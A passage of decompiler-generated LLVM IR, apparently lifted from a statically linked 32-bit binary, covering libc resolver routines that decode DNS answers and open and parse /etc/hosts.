  %v4_8056a71 = select i1 %v1_8056a71, i32 %v1_8056a6e, i32 %v2_8056a67
  ret i32 %v4_8056a71

; uselistorder directives
  uselistorder i32 %v2_8056a67, { 1, 0, 2 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8056a78 = load i32, i32* @ebp, align 4
  %v0_8056a79 = load i32, i32* @edi, align 4
  %v0_8056a7a = load i32, i32* @esi, align 4
  %v0_8056a7b = load i32, i32* @ebx, align 4
  store i32 %v0_8056a7b, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_8056a9c = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8056a9c, i32* %eax.global-to-local, align 4
  %v4_8056aa9 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_8056a9c, i32 256)
  store i32 %v4_8056aa9, i32* %eax.global-to-local, align 4
  %v3_8056ab1 = icmp slt i32 %v4_8056aa9, 0
  store i32 %v4_8056aa9, i32* @edi, align 4
  br i1 %v3_8056ab1, label %dec_label_pc_8056b64, label %dec_label_pc_8056abb

dec_label_pc_8056abb:                             ; preds = %entry
  %v0_8056abb = load i32, i32* @ebx, align 4
  %v3_8056abb = add i32 %v0_8056abb, %v4_8056aa9
  %v0_8056abd = load i32, i32* @esi, align 4
  %v2_8056abd = sub i32 %v0_8056abd, %v3_8056abb
  %v1_8056abf = add i32 %v2_8056abd, -10
  %v10_8056abf = icmp slt i32 %v1_8056abf, 0
  store i32 %v1_8056abf, i32* @esi, align 4
  %v1_8056aca = icmp eq i1 %v10_8056abf, false
  br i1 %v1_8056aca, label %dec_label_pc_8056ad3, label %dec_label_pc_8056acc

dec_label_pc_8056acc:                             ; preds = %dec_label_pc_8056abb
  br label %dec_label_pc_8056b64

dec_label_pc_8056ad3:                             ; preds = %dec_label_pc_8056abb
  %v6_8056ada = add i32 %v3_8056abb, %tmp4
  store i32 %v6_8056ada, i32* @ebx, align 4
  store i32 %v2_8056a9c, i32* %eax.global-to-local, align 4
  %v1_8056ae6 = bitcast i32* %stack_var_-272 to i8*
  %v2_8056ae6 = call i32 @__GI_strdup(i8* %v1_8056ae6)
  store i32 %v2_8056ae6, i32* %eax.global-to-local, align 4
  %v0_8056aeb = load i32, i32* @ebx, align 4
  %v1_8056aeb = add i32 %v0_8056aeb, 4
  store i32 %v1_8056aeb, i32* %esi.global-to-local, align 4
  %v1_8056aee = load i32, i32* @ebp, align 4
  %v2_8056aee = inttoptr i32 %v1_8056aee to i32*
  store i32 %v2_8056ae6, i32* %v2_8056aee, align 4
  %v0_8056af1 = load i32, i32* @ebx, align 4
  %v1_8056af1 = inttoptr i32 %v0_8056af1 to i8*
  %v2_8056af1 = load i8, i8* %v1_8056af1, align 1
  %v3_8056af1 = zext i8 %v2_8056af1 to i32
  store i32 %v3_8056af1, i32* %eax.global-to-local, align 4
  %v1_8056af4 = add i32 %v0_8056af1, 1
  %v2_8056af4 = inttoptr i32 %v1_8056af4 to i8*
  %v3_8056af4 = load i8, i8* %v2_8056af4, align 1
  %v4_8056af4 = zext i8 %v3_8056af4 to i32
  store i32 %v4_8056af4, i32* %edx.global-to-local, align 4
  %v2_8056af8 = mul nuw nsw i32 %v3_8056af1, 256
  %v2_8056afb = or i32 %v4_8056af4, %v2_8056af8
  store i32 %v2_8056afb, i32* %eax.global-to-local, align 4
  %v1_8056afd = load i32, i32* @ebp, align 4
  %v2_8056afd = add i32 %v1_8056afd, 4
  %v3_8056afd = inttoptr i32 %v2_8056afd to i32*
  store i32 %v2_8056afb, i32* %v3_8056afd, align 4
  %v0_8056b00 = load i32, i32* @ebx, align 4
  %v1_8056b00 = add i32 %v0_8056b00, 2
  %v2_8056b00 = inttoptr i32 %v1_8056b00 to i8*
  %v3_8056b00 = load i8, i8* %v2_8056b00, align 1
  %v4_8056b00 = zext i8 %v3_8056b00 to i32
  store i32 %v4_8056b00, i32* %eax.global-to-local, align 4
  %v1_8056b04 = add i32 %v0_8056b00, 3
  %v2_8056b04 = inttoptr i32 %v1_8056b04 to i8*
  %v3_8056b04 = load i8, i8* %v2_8056b04, align 1
  %v4_8056b04 = zext i8 %v3_8056b04 to i32
  store i32 %v4_8056b04, i32* %edx.global-to-local, align 4
  %v2_8056b08 = mul nuw nsw i32 %v4_8056b00, 256
  %v2_8056b0b = or i32 %v4_8056b04, %v2_8056b08
  store i32 %v2_8056b0b, i32* %eax.global-to-local, align 4
  %v1_8056b0d = load i32, i32* @ebp, align 4
  %v2_8056b0d = add i32 %v1_8056b0d, 8
  %v3_8056b0d = inttoptr i32 %v2_8056b0d to i32*
  store i32 %v2_8056b0b, i32* %v3_8056b0d, align 4
  %v0_8056b10 = load i32, i32* @ebx, align 4
  %v1_8056b10 = add i32 %v0_8056b10, 4
  %v2_8056b10 = inttoptr i32 %v1_8056b10 to i8*
  %v3_8056b10 = load i8, i8* %v2_8056b10, align 1
  %v4_8056b10 = zext i8 %v3_8056b10 to i32
  store i32 %v4_8056b10, i32* %edx.global-to-local, align 4
  %v0_8056b14 = load i32, i32* %esi.global-to-local, align 4
  %v1_8056b14 = add i32 %v0_8056b14, 1
  %v2_8056b14 = inttoptr i32 %v1_8056b14 to i8*
  %v3_8056b14 = load i8, i8* %v2_8056b14, align 1
  %v4_8056b14 = zext i8 %v3_8056b14 to i32
  store i32 %v4_8056b14, i32* %eax.global-to-local, align 4
  %v1_8056b18 = add i32 %v0_8056b14, 2
  %v2_8056b18 = inttoptr i32 %v1_8056b18 to i8*
  %v3_8056b18 = load i8, i8* %v2_8056b18, align 1
  %v4_8056b18 = zext i8 %v3_8056b18 to i32
  %v2_8056b1c = mul nuw i32 %v4_8056b10, 16777216
  %v2_8056b1f = mul nuw nsw i32 %v4_8056b14, 65536
  store i32 %v2_8056b1f, i32* %eax.global-to-local, align 4
  %v2_8056b22 = or i32 %v2_8056b1f, %v2_8056b1c
  store i32 %v2_8056b22, i32* %edx.global-to-local, align 4
  %v1_8056b24 = add i32 %v0_8056b14, 3
  %v2_8056b24 = inttoptr i32 %v1_8056b24 to i8*
  %v3_8056b24 = load i8, i8* %v2_8056b24, align 1
  %v4_8056b24 = zext i8 %v3_8056b24 to i32
  store i32 %v4_8056b24, i32* %eax.global-to-local, align 4
  %v2_8056b28 = mul nuw nsw i32 %v4_8056b18, 256
  %v2_8056b2b = or i32 %v4_8056b24, %v2_8056b22
  store i32 %v2_8056b2b, i32* %edx.global-to-local, align 4
  %v2_8056b2d = or i32 %v2_8056b2b, %v2_8056b28
  store i32 %v2_8056b2d, i32* @ecx, align 4
  %v1_8056b2f = load i32, i32* @ebp, align 4
  %v2_8056b2f = add i32 %v1_8056b2f, 12
  %v3_8056b2f = inttoptr i32 %v2_8056b2f to i32*
  store i32 %v2_8056b2d, i32* %v3_8056b2f, align 4
  %v0_8056b32 = load i32, i32* @ebx, align 4
  %v1_8056b32 = add i32 %v0_8056b32, 8
  %v2_8056b32 = inttoptr i32 %v1_8056b32 to i8*
  %v3_8056b32 = load i8, i8* %v2_8056b32, align 1
  %v4_8056b32 = zext i8 %v3_8056b32 to i32
  store i32 %v4_8056b32, i32* %edx.global-to-local, align 4
  %v1_8056b36 = add i32 %v0_8056b32, 9
  %v2_8056b36 = inttoptr i32 %v1_8056b36 to i8*
  %v3_8056b36 = load i8, i8* %v2_8056b36, align 1
  %v4_8056b36 = zext i8 %v3_8056b36 to i32
  store i32 %v4_8056b36, i32* %eax.global-to-local, align 4
  %v1_8056b3a = add i32 %v0_8056b32, 10
  %v1_8056b3d = load i32, i32* @ebp, align 4
  %v2_8056b3d = add i32 %v1_8056b3d, 20
  %v3_8056b3d = inttoptr i32 %v2_8056b3d to i32*
  store i32 %v1_8056b3a, i32* %v3_8056b3d, align 4
  %v0_8056b40 = load i32, i32* %edx.global-to-local, align 4
  %v2_8056b40 = mul i32 %v0_8056b40, 256
  %v1_8056b43 = load i32, i32* %eax.global-to-local, align 4
  %v2_8056b43 = or i32 %v1_8056b43, %v2_8056b40
  store i32 %v2_8056b43, i32* @edx, align 4
  %v1_8056b45 = load i32, i32* @ebp, align 4
  %v2_8056b45 = add i32 %v1_8056b45, 16
  %v3_8056b45 = inttoptr i32 %v2_8056b45 to i32*
  store i32 %v2_8056b43, i32* %v3_8056b45, align 4
  %v1_8056b4f = add i32 %v3_8056abb, 10
  store i32 %v1_8056b4f, i32* %eax.global-to-local, align 4
  %v1_8056b52 = load i32, i32* @ebp, align 4
  %v2_8056b52 = add i32 %v1_8056b52, 24
  %v3_8056b52 = inttoptr i32 %v2_8056b52 to i32*
  store i32 %v1_8056b4f, i32* %v3_8056b52, align 4
  %v4_8056b55 = load i32, i32* @edx, align 4
  %v5_8056b59 = icmp slt i32 %v1_8056abf, %v4_8056b55
  br i1 %v5_8056b59, label %dec_label_pc_8056b5b, label %dec_label_pc_8056b60

dec_label_pc_8056b5b:                             ; preds = %dec_label_pc_8056ad3
  br label %dec_label_pc_8056b64

dec_label_pc_8056b60:                             ; preds = %dec_label_pc_8056ad3
  %v1_8056b60 = load i32, i32* @edi, align 4
  %v2_8056b60 = add i32 %v4_8056b55, 10
  %v3_8056b60 = add i32 %v2_8056b60, %v1_8056b60
  br label %dec_label_pc_8056b64

dec_label_pc_8056b64:                             ; preds = %entry, %dec_label_pc_8056b5b, %dec_label_pc_8056acc, %dec_label_pc_8056b60
  %v0_8056b6a = phi i32 [ %v4_8056aa9, %entry ], [ -1, %dec_label_pc_8056b5b ], [ %v1_8056abf, %dec_label_pc_8056acc ], [ %v3_8056b60, %dec_label_pc_8056b60 ]
  store i32 %v0_8056b6a, i32* %eax.global-to-local, align 4
  %v2_8056b6c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8056b6c, i32* @ebx, align 4
  store i32 %v0_8056a7a, i32* @esi, align 4
  store i32 %v0_8056a79, i32* @edi, align 4
  store i32 %v0_8056a78, i32* @ebp, align 4
  ret i32 %v0_8056b6a

; uselistorder directives
  uselistorder i32 %v0_8056b6a, { 1, 0 }
  uselistorder i32 %v2_8056b1f, { 1, 0 }
  uselistorder i32 %v1_8056abf, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8056abb, { 1, 0, 2 }
  uselistorder i32 %v4_8056aa9, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_8056a9c, { 1, 0, 2 }
  uselistorder i32 24, { 31, 32, 20, 0, 33, 34, 35, 21, 5, 10, 38, 11, 12, 13, 36, 22, 23, 24, 25, 26, 27, 28, 40, 2, 37, 14, 15, 16, 17, 18, 19, 3, 29, 4, 6, 7, 8, 9, 30, 1, 39 }
  uselistorder i32 20, { 34, 35, 36, 37, 2, 18, 41, 5, 42, 38, 39, 3, 19, 20, 1, 8, 9, 33, 10, 11, 12, 21, 22, 23, 24, 25, 6, 26, 27, 44, 40, 4, 13, 14, 15, 16, 17, 7, 28, 29, 30, 31, 32, 43, 0 }
  uselistorder i32 9, { 20, 21, 22, 23, 7, 24, 14, 15, 5, 13, 0, 8, 16, 17, 18, 19, 9, 10, 11, 12, 6, 3, 2, 25, 1, 26, 4 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 7, 9, 8, 11, 10 }
  uselistorder i32 3, { 58, 59, 60, 61, 62, 63, 21, 0, 12, 1, 22, 2, 17, 57, 3, 64, 23, 5, 4, 6, 10, 11, 9, 24, 13, 25, 49, 20, 50, 32, 33, 34, 35, 36, 37, 65, 18, 19, 38, 26, 15, 16, 7, 39, 30, 55, 29, 56, 28, 40, 27, 41, 42, 43, 44, 45, 51, 52, 53, 54, 8, 31, 46, 47, 48, 14 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8056b64, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_8056b81 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_80617a5.804 to i32), i32 ptrtoint (i32* @global_var_8061770.792 to i32))
  store i32 %v3_8056b81, i32* @eax, align 4
  %v1_8056b89 = icmp eq i32 %v3_8056b81, 0
  %v1_8056b8b = icmp eq i1 %v1_8056b89, false
  br i1 %v1_8056b8b, label %dec_label_pc_8056ba1, label %dec_label_pc_8056b8d

dec_label_pc_8056b8d:                             ; preds = %entry
  %v3_8056b99 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_80617b0.805 to i32), i32 ptrtoint (i32* @global_var_8061770.792 to i32))
  br label %dec_label_pc_8056ba1

dec_label_pc_8056ba1:                             ; preds = %entry, %dec_label_pc_8056b8d
  %v0_8056ba4 = phi i32 [ %v3_8056b81, %entry ], [ %v3_8056b99, %dec_label_pc_8056b8d ]
  ret i32 %v0_8056ba4

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0, 6, 5, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_8061770.792 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_8056ba1, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp60 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_8056ba5 = load i32, i32* @ebp, align 4
  %v0_8056ba6 = load i32, i32* @edi, align 4
  %v0_8056ba7 = load i32, i32* @esi, align 4
  %v0_8056ba8 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_8056bb6 = sub i32 0, %arg6
  %v1_8056bb8 = urem i32 %v1_8056bb6, 4
  %v2_8056bb8 = icmp eq i32 %v1_8056bb8, 0
  store i32 %v1_8056bb8, i32* %eax.global-to-local, align 4
  br i1 %v2_8056bb8, label %dec_label_pc_8056bc9, label %dec_label_pc_8056bbd

dec_label_pc_8056bbd:                             ; preds = %entry
  %v2_8056bbd = sub i32 %arg7, %v1_8056bb8
  %v7_8056bbd = icmp ugt i32 %v1_8056bb8, %arg7
  br i1 %v7_8056bbd, label %dec_label_pc_8056e6d, label %dec_label_pc_8056bc5

dec_label_pc_8056bc5:                             ; preds = %dec_label_pc_8056bbd
  %v2_8056bc5 = add i32 %v1_8056bb8, %arg6
  store i32 %v2_8056bc5, i32* @ebx, align 4
  store i32 %v2_8056bbd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8056bc9

dec_label_pc_8056bc9:                             ; preds = %entry, %dec_label_pc_8056bc5
  %v0_8056bd7 = phi i32 [ %arg6, %entry ], [ %v2_8056bc5, %dec_label_pc_8056bc5 ]
  %v0_8056bde = phi i32 [ %arg7, %entry ], [ %v2_8056bbd, %dec_label_pc_8056bc5 ]
  %tmp = icmp ult i32 %v0_8056bde, 32
  br i1 %tmp, label %dec_label_pc_8056e6d, label %dec_label_pc_8056bd2

dec_label_pc_8056bd2:                             ; preds = %dec_label_pc_8056bc9
  %v12_8056bd2 = icmp eq i32 %arg4, 1
  %v1_8056bd7 = add i32 %v0_8056bd7, 32
  store i32 %v1_8056bd7, i32* %eax.global-to-local, align 4
  %v1_8056bde = add i32 %v0_8056bde, -32
  store i32 %v1_8056bde, i32* @ebp, align 4
  br i1 %v12_8056bd2, label %dec_label_pc_8056bd2.dec_label_pc_8056d1d_crit_edge, label %dec_label_pc_8056be7

dec_label_pc_8056bd2.dec_label_pc_8056d1d_crit_edge: ; preds = %dec_label_pc_8056bd2
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_8056d1d

dec_label_pc_8056be7:                             ; preds = %dec_label_pc_8056bd2
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_8056bee = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_8056bee, align 4
  %tmp144 = icmp ult i32 %v1_8056bde, 4
  br i1 %tmp144, label %dec_label_pc_8056e6d, label %dec_label_pc_8056bfa

dec_label_pc_8056bfa:                             ; preds = %dec_label_pc_8056be7
  %v0_8056bfa = load i32, i32* %edx.global-to-local, align 4
  %v1_8056bfa = add i32 %v0_8056bfa, -36
  store i32 %v1_8056bfa, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ult i32 %v1_8056bfa, 8
  br i1 %tmp145, label %dec_label_pc_8056e6d, label %dec_label_pc_8056c06

dec_label_pc_8056c06:                             ; preds = %dec_label_pc_8056bfa
  %v0_8056c06 = load i32, i32* @ebp, align 4
  %tmp146 = icmp ult i32 %v0_8056c06, 16
  br i1 %tmp146, label %dec_label_pc_8056e6d, label %dec_label_pc_8056c0f

dec_label_pc_8056c0f:                             ; preds = %dec_label_pc_8056c06
  %v1_8056c0f = add i32 %v0_8056bfa, -48
  store i32 %v1_8056c0f, i32* %eax.global-to-local, align 4
  %tmp147 = icmp ult i32 %v1_8056c0f, 8
  br i1 %tmp147, label %dec_label_pc_8056e6d, label %dec_label_pc_8056c1b

dec_label_pc_8056c1b:                             ; preds = %dec_label_pc_8056c0f
  %v0_8056c1b = load i32, i32* @ebx, align 4
  %v1_8056c1b = add i32 %v0_8056c1b, 48
  %v1_8056c1e = add i32 %v0_8056bfa, -44
  store i32 %v1_8056c1e, i32* @ebp, align 4
  %v1_8056c25 = add i32 %v0_8056bfa, -56
  store i32 %v1_8056c25, i32* @eax, align 4
  %v7_8056c28 = icmp ult i32 %v1_8056c25, %v1_8056c1e
  %v1_8056c2a = add i32 %v0_8056c1b, 36
  store i32 %v1_8056c2a, i32* @edi, align 4
  br i1 %v7_8056c28, label %dec_label_pc_8056c34, label %dec_label_pc_8056c2f

dec_label_pc_8056c2f:                             ; preds = %dec_label_pc_8056c1b
  %v1_8056c2f = add i32 %v0_8056c1b, 44
  store i32 %v1_8056c2f, i32* @esi, align 4
  br label %dec_label_pc_8056c39

dec_label_pc_8056c34:                             ; preds = %dec_label_pc_8056c1b
  %v1_8056c34 = add i32 %v0_8056c1b, 56
  store i32 %v1_8056c34, i32* @esi, align 4
  store i32 %v1_8056c25, i32* @ebp, align 4
  br label %dec_label_pc_8056c39

dec_label_pc_8056c39:                             ; preds = %dec_label_pc_8056c2f, %dec_label_pc_8056c34
  %v0_8056c39 = phi i32 [ %v1_8056c1e, %dec_label_pc_8056c2f ], [ %v1_8056c25, %dec_label_pc_8056c34 ]
  %tmp148 = icmp ult i32 %v0_8056c39, 80
  br i1 %tmp148, label %dec_label_pc_8056e6d, label %dec_label_pc_8056c42

dec_label_pc_8056c42:                             ; preds = %dec_label_pc_8056c39
  %v0_8056c42 = call i32 @__open_etc_hosts()
  store i32 %v0_8056c42, i32* %eax.global-to-local, align 4
  %v1_8056c47 = icmp eq i32 %v0_8056c42, 0
  br i1 %v1_8056c47, label %dec_label_pc_8056c6f, label %dec_label_pc_8056c4f

dec_label_pc_8056c4f:                             ; preds = %dec_label_pc_8056c42
  store i32 %v1_8056bd7, i32* %edx.global-to-local, align 4
  store i32 %v1_8056c1b, i32* %eax.global-to-local, align 4
  %v0_8056c57 = load i32, i32* @edi, align 4
  %v0_8056c5b = load i32, i32* @esi, align 4
  %v4_8056c5f = inttoptr i32 %v1_8056bd7 to i8*
  br label %dec_label_pc_8056d1d

dec_label_pc_8056c6f:                             ; preds = %dec_label_pc_8056c42
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_8056c73 = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_8056c73, align 4
  %v1_8056c79 = call i32 @__errno_location(i32 0)
  store i32 %v1_8056c79, i32* %eax.global-to-local, align 4
  %v1_8056c7e = inttoptr i32 %v1_8056c79 to i32*
  %v2_8056c7e = load i32, i32* %v1_8056c7e, align 4
  store i32 %v2_8056c7e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056e6d

dec_label_pc_8056c89:                             ; preds = %dec_label_pc_8056df0
  %v2_8056c89 = load i8*, i8** %stack_var_-44, align 4
  %v3_8056c89 = ptrtoint i8* %v2_8056c89 to i32
  store i32 %v3_8056c89, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_8056c90 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_8056c89, i32* %v2_8056c90, align 4
  %v0_8056c92 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056c92 = add i32 %v0_8056c92, 4
  %v2_8056c92 = inttoptr i32 %v1_8056c92 to i32*
  store i32 0, i32* %v2_8056c92, align 4
  %v0_8056c99 = load i32, i32* @ebx, align 4
  %v1_8056c99 = add i32 %v0_8056c99, 4
  %v2_8056c99 = inttoptr i32 %v1_8056c99 to i32*
  %v3_8056c99 = load i32, i32* %v2_8056c99, align 4
  store i32 %v3_8056c99, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_8056c99, i32* %arg5, align 4
  %v1_8056ca2 = add i32 %tmp60, 8
  %v2_8056ca2 = inttoptr i32 %v1_8056ca2 to i32*
  store i32 2, i32* %v2_8056ca2, align 4
  %v0_8056ca9 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056ca9 = add i32 %v0_8056ca9, 12
  %v2_8056ca9 = inttoptr i32 %v1_8056ca9 to i32*
  store i32 4, i32* %v2_8056ca9, align 4
  br label %dec_label_pc_8056ce2

dec_label_pc_8056cb6:                             ; preds = %dec_label_pc_8056e12
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  store i32 %storemerge3, i32* %edx.global-to-local, align 4
  %v2_8056cbe = inttoptr i32 %storemerge3 to i32*
  store i32 %stack_var_-36.0, i32* %v2_8056cbe, align 4
  %v0_8056cc0 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056cc0 = add i32 %v0_8056cc0, 4
  %v2_8056cc0 = inttoptr i32 %v1_8056cc0 to i32*
  store i32 0, i32* %v2_8056cc0, align 4
  %v0_8056cc7 = load i32, i32* @ebx, align 4
  %v1_8056cc7 = add i32 %v0_8056cc7, 4
  %v2_8056cc7 = inttoptr i32 %v1_8056cc7 to i32*
  %v3_8056cc7 = load i32, i32* %v2_8056cc7, align 4
  store i32 %v3_8056cc7, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_8056cc7, i32* %arg5, align 4
  %v1_8056cd0 = add i32 %tmp60, 8
  %v2_8056cd0 = inttoptr i32 %v1_8056cd0 to i32*
  store i32 10, i32* %v2_8056cd0, align 4
  %v0_8056cd7 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056cd7 = add i32 %v0_8056cd7, 12
  %v2_8056cd7 = inttoptr i32 %v1_8056cd7 to i32*
  store i32 16, i32* %v2_8056cd7, align 4
  br label %dec_label_pc_8056ce2

dec_label_pc_8056ce2:                             ; preds = %dec_label_pc_8056c89, %dec_label_pc_8056cb6
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_8056c89 ], [ %storemerge3, %dec_label_pc_8056cb6 ]
  %v1_8056ce2 = load i32, i32* %edx.global-to-local, align 4
  %v2_8056ce2 = add i32 %v1_8056ce2, 16
  %v3_8056ce2 = inttoptr i32 %v2_8056ce2 to i32*
  store i32 %storemerge, i32* %v3_8056ce2, align 4
  %v0_8056ce5 = load i32, i32* @ebx, align 4
  %v1_8056ce5 = add i32 %v0_8056ce5, 8
  %v1_8056ce8 = load i32, i32* %edx.global-to-local, align 4
  %v2_8056ce8 = add i32 %v1_8056ce8, 4
  %v3_8056ce8 = inttoptr i32 %v2_8056ce8 to i32*
  store i32 %v1_8056ce5, i32* %v3_8056ce8, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_8056cef = load i32, i32* %edx.global-to-local, align 4
  %v2_8056cef = inttoptr i32 %arg8 to i32*
  store i32 %v0_8056cef, i32* %v2_8056cef, align 4
  br label %dec_label_pc_8056e4d

dec_label_pc_8056d1d:                             ; preds = %dec_label_pc_8056bd2.dec_label_pc_8056d1d_crit_edge, %dec_label_pc_8056c4f
  %v1_8056d21.pre-phi = phi i32* [ %.pre, %dec_label_pc_8056bd2.dec_label_pc_8056d1d_crit_edge ], [ %v1_8056bee, %dec_label_pc_8056c4f ]
  %storemerge4 = phi i8* [ null, %dec_label_pc_8056bd2.dec_label_pc_8056d1d_crit_edge ], [ %v4_8056c5f, %dec_label_pc_8056c4f ]
  %stack_var_-20.0.in = phi i32 [ %v1_8056bd7, %dec_label_pc_8056bd2.dec_label_pc_8056d1d_crit_edge ], [ %v0_8056c5b, %dec_label_pc_8056c4f ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_8056bd2.dec_label_pc_8056d1d_crit_edge ], [ %v1_8056bd7, %dec_label_pc_8056c4f ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_8056bd2.dec_label_pc_8056d1d_crit_edge ], [ %v0_8056c57, %dec_label_pc_8056c4f ]
  %stack_var_4.0 = phi i32 [ %arg1, %dec_label_pc_8056bd2.dec_label_pc_8056d1d_crit_edge ], [ %v0_8056c42, %dec_label_pc_8056c4f ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_8056bd2.dec_label_pc_8056d1d_crit_edge ], [ %v1_8056c1b, %dec_label_pc_8056c4f ]
  store i8* %storemerge4, i8** %stack_var_-44, align 4
  %stack_var_-20.0 = inttoptr i32 %stack_var_-20.0.in to i8*
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_8056d21.pre-phi, align 4
  %v12_8056dab = icmp eq i32 %arg4, 2
  %v2_8056dd6 = inttoptr i32 %arg2 to i8*
  %v12_8056de9 = icmp eq i32 %arg3, 2
  %v12_8056e0b = icmp eq i32 %arg3, 10
  %v1_8056db5 = icmp eq i1 %v12_8056dab, false
  %v1_8056dee = icmp eq i1 %v12_8056de9, false
  %v1_8056e10 = icmp eq i1 %v12_8056e0b, false
  br label %dec_label_pc_8056e33.outer

dec_label_pc_8056e33.outer:                       ; preds = %dec_label_pc_8056e0b, %dec_label_pc_8056e12, %dec_label_pc_8056df0, %dec_label_pc_8056d1d
  %stack_var_-28.0.ph = phi i32 [ 1, %dec_label_pc_8056d1d ], [ 2, %dec_label_pc_8056df0 ], [ 2, %dec_label_pc_8056e12 ], [ 2, %dec_label_pc_8056e0b ]
  br label %dec_label_pc_8056e33

dec_label_pc_8056d34:                             ; preds = %dec_label_pc_8056e33
  %v3_8056d3c = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_8056d3c, i32* @eax, align 4
  %v1_8056d44 = icmp eq i32 %v3_8056d3c, 0
  br i1 %v1_8056d44, label %dec_label_pc_8056d4b, label %dec_label_pc_8056d48

dec_label_pc_8056d48:                             ; preds = %dec_label_pc_8056d34
  %v1_8056d48 = inttoptr i32 %v3_8056d3c to i8*
  store i8 0, i8* %v1_8056d48, align 1
  br label %dec_label_pc_8056d4b

dec_label_pc_8056d4b:                             ; preds = %dec_label_pc_8056d34, %dec_label_pc_8056d48
  store i32 %stack_var_-20.0.in, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_8056d8b34 = load i8, i8* %stack_var_-20.0, align 1
  %v3_8056d8b35 = icmp eq i8 %v2_8056d8b34, 0
  %v1_8056d8e41 = icmp eq i1 %v3_8056d8b35, false
  br i1 %v1_8056d8e41, label %dec_label_pc_8056d57.preheader.preheader, label %dec_label_pc_8056d90

dec_label_pc_8056d57.preheader.preheader:         ; preds = %dec_label_pc_8056d4b
  %v4_8056d5798.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8056d57.preheader

dec_label_pc_8056d53:                             ; preds = %dec_label_pc_8056d5d
  store i8 0, i8* %v1_8056d57104, align 1
  %v0_8056d56 = load i32, i32* @ecx, align 4
  %v1_8056d56 = add i32 %v0_8056d56, 1
  store i32 %v1_8056d56, i32* @ecx, align 4
  %v1_8056d57 = inttoptr i32 %v1_8056d56 to i8*
  %v2_8056d57 = load i8, i8* %v1_8056d57, align 1
  %v3_8056d57 = zext i8 %v2_8056d57 to i32
  %v4_8056d57 = load i32, i32* %eax.global-to-local, align 4
  %v5_8056d57 = and i32 %v4_8056d57, -256
  %v6_8056d57 = or i32 %v5_8056d57, %v3_8056d57
  store i32 %v6_8056d57, i32* @eax, align 4
  %v4_8056d59 = icmp eq i8 %v2_8056d57, 0
  br i1 %v4_8056d59, label %dec_label_pc_8056d57.dec_label_pc_8056d90.loopexit_crit_edge, label %dec_label_pc_8056d5d

dec_label_pc_8056d5d:                             ; preds = %dec_label_pc_8056d57.preheader, %dec_label_pc_8056d53
  %v2_8056d57105 = phi i8 [ %v2_8056d57, %dec_label_pc_8056d53 ], [ %v2_8056d5796, %dec_label_pc_8056d57.preheader ]
  %v1_8056d57104 = phi i8* [ %v1_8056d57, %dec_label_pc_8056d53 ], [ %v1_8056d5795, %dec_label_pc_8056d57.preheader ]
  %v0_8056d53103 = phi i32 [ %v1_8056d56, %dec_label_pc_8056d53 ], [ %v0_8056d5749, %dec_label_pc_8056d57.preheader ]
  %v2_8056d5d = sext i8 %v2_8056d57105 to i32
  store i32 %v2_8056d5d, i32* @edx, align 4
  %v0_8056d60 = load i32, i32* @global_var_80622cc, align 4
  store i32 %v0_8056d60, i32* %eax.global-to-local, align 4
  %v2_8056d65 = mul nsw i32 %v2_8056d5d, 2
